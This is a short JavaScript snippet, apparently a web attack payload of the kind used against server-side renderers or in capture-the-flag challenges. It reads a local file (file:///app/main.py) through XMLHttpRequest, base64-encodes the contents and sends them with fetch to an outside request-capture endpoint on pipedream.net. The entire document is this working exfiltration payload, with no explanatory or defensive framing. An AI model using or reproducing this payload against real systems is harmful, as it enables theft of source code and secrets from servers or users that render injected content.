var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///app/main.py");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders());
    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' +btoa(text));
};
xhr.send(null);
